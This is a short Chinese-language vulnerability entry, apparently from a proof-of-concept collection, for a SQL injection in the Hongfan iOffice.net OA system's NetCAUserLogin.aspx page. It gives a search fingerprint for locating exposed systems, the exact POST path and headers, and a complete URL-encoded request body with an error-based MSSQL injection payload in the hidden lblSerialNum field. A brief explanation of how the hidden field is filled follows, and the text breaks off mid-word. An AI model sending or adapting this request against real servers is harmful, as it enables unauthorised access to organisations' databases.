# 红帆OANetCAUserLogin.aspx存在SQL注入漏洞

- **系统**：红帆　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="iOffice.net"`
- **请求**：`POST /ioffice/Identity/NetCAUserLogin.aspx HTTP/1.1`
- **关键头**：`X-MicrosoftAjax: Delta=true`　`Content-Type: application/x-www-form-urlencoded; charset=utf-8`

**请求体 / payload**
```
ioScriptManager1%24ScriptManager1=updatePanel1%7CbtVerify&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEyMTUyMDIxNTRkZP07H79WIvd3R0It8GvgZeNLQtUV&__VIEWSTATEGENERATOR=65AD83CA&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=0&lblSerialNum=%27+AND+9176+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289176%3D9176%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--+Vgmc&__ASYNCPOST=true&btVerify=
```
- **预期**：200　|　注入点lblSerialNum
隐藏的文本输入框，通过style="width:0px"隐藏
页面加载时自动执行GetThumbPrint_Demo()，证书指纹会赋给字段lblSerialNum，
触发btVerify.click()提交表单。
流程：证书读取 → 指纹提取 → 隐藏字段赋值 → 表单提交 → 后端处